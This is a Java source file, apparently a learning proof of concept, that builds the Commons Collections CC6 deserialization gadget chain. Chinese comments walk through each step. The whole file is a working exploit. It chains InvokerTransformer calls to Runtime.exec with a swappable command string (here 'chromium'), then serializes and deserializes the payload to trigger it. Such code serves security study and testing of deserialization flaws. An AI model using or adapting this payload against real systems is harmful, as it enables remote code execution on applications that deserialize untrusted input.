package cc6;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import toolkit.Seriliazation;

import java.io.IOException;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

/**
 * 最好用的 cc 链，不受 jdk 版本限制
 */
public class CC6Chain {
    private static String injectedCmd = "chromium";

    public static void main(String[] args) throws IOException, ClassNotFoundException, InvocationTargetException, NoSuchMethodException, InstantiationException, IllegalAccessException, NoSuchFieldException {
        cc6();
    }

    /**
     * Hashmap.readObject()
     *  -> hash(key)
     *      => HashMap.hash()
     *          -> key.hashCode() 把这个 key 变成一个 TiedMapEntry
     *          => TiedMapEntry.hashCode()
     *              -> TiedMapEntry.getValue()
     *                  -> map.get(key) 把这个 map 变成 lazymap
     *                  => LazyMap.get()
     */
    public static void cc6() throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, NoSuchFieldException {
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec",new Class[]{String.class},new Object[]{injectedCmd}),
                new ConstantTransformer(new HashSet<String>())
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);

        // 创建一个序列化对象
        HashMap hashMap = new HashMap();
        // 构造一个 LazyMap
        HashMap innerMap = new HashMap();
        // 使用 ConstantTransformer 防止在 put 的时候就触发
        LazyMap lazyMap = (LazyMap) LazyMap.decorate(innerMap, new ConstantTransformer(1));

        // 创造完 TiedMapEntry 之后，lazyMap 和 tiedKey 就绑定了
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, "tiedKey");
        hashMap.put(tiedMapEntry, "aaa");
        // hashmap.put 之后，会触发 lazyMap 的 get innerMap 会被放进去 tieKey -> 1
        // 反序列化的时候会再次调用 tiedMapEntry.hashCode()，会再次 get(key="tiedMap")，如果不存在就会走 Transformer
        innerMap.remove("tiedKey");

        // 重新赋值
        Class clazz_lazyMap = LazyMap.class;
        Field fieldFactory = clazz_lazyMap.getDeclaredField("factory");
        fieldFactory.setAccessible(true);
        fieldFactory.set(lazyMap, chainedTransformer);

        Seriliazation.serialize(hashMap);
        Seriliazation.unserialize("ser.bin");
    }
}